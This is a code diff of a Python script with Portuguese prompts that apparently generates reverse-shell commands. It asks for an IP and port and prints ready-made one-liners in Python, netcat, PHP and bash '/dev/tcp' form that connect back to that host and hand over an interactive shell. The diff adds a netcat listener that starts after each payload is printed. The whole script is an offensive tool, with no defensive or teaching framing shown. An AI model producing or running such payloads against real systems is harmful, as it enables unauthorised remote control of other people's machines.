@@ -30,24 +30,33 @@ if foda == 1:
 	porta_foda = input("PORTA: ")
 	print("""
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{})) """.format(ip_foda, porta_foda))
+	print("escutando...")
+	os.system("nc -nlvp {}".format(porta_foda))
 
 elif foda == 2:
 	ip_fds = input("IP: ")
-	porta_fds = input("PORTA: ")
+	porta_fds = (input("PORTA: "))
 	print("""
 nc -e /bin/bash {} {}""".format(ip_fds, porta_fds))
+	print("escutando...")
+	os.system("nc -nlvp {}".format(porta_fds))
+
 elif foda == 3:
 	ip_pika = input("IP: ")
 	porta_pika = input("PORTA: ")
 	print("""
 php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");' """.format(ip_pika, porta_pika))
+	print("escutando...")
+	os.system("nc -nlvp {}".format(porta_pika))
 
 elif foda == 4:
 	ip_puta = input("IP: ")
 	porta_puta = input("PORTA: ")
 	print("""
-	bash -i >& /dev/tcp/{}/{} 0>&1""".format(ip_puta, porta_puta))
-	
+bash -i >& /dev/tcp/{}/{} 0>&1""".format(ip_puta, porta_puta))
+	print("escutando...")
+	os.system("nc -nlvp {}".format(porta_puta))
+
 elif foda == 5:
 	print("""
 [INSTAGRAM]: @gt9sec
